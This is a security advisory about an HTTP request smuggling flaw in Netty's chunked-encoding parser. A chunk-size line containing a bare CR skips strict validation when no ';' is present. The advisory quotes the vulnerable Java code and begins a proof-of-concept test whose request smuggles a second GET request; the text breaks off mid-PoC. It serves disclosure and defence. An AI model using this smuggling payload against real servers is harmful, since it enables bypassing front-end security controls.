title: "### Summary\r\nNetty skips strict chunk size line validation when the line
  has no chunk extension (`;`), so a chunk size line containing an embedded bare CR
  (e.g. `0\\rX`) is accepted instead of rejected, enabling HTTP request smuggling.\r\
  \n\r\n### Details\r\n`io.netty.handler.codec.http.HttpObjectDecoder#checkChunkExtensions`
  only runs the strict validator `HttpChunkLineValidatingByteProcessor` when a `;`
  is present:\r\n\r\n```java\r\n        int extensionsStart = line.bytesBefore((byte)
  ';');\r\n        if (extensionsStart == -1) {\r\n            return;\r\n       \
  \ }\r\n```\r\n\r\nAccording to RFC 9112 https://datatracker.ietf.org/doc/html/rfc9112#appendix-A\r\
  \n\r\n`chunk-size = 1*HEXDIG`\r\n\r\n### PoC\r\n\r\n```java\r\n@Test\r\npublic void
  test() {\r\n    String requestStr = \"POST / HTTP/1.1\\r\\n\" +\r\n            \"\
  Host: localhost\\r\\n\" +\r\n            \"Transfer-Encoding: chunked\\r\\n\\r\\\
  n\" +\r\n            \"0\\rX\\r\\n\" +\r\n            \"\\r\\n\" +\r\n         \
  \   \"GET /smuggled HTTP/1.1\\r\\n\" +\r\n            \"Host: localhost\\r\\n\"\
  \ +\r\n            "
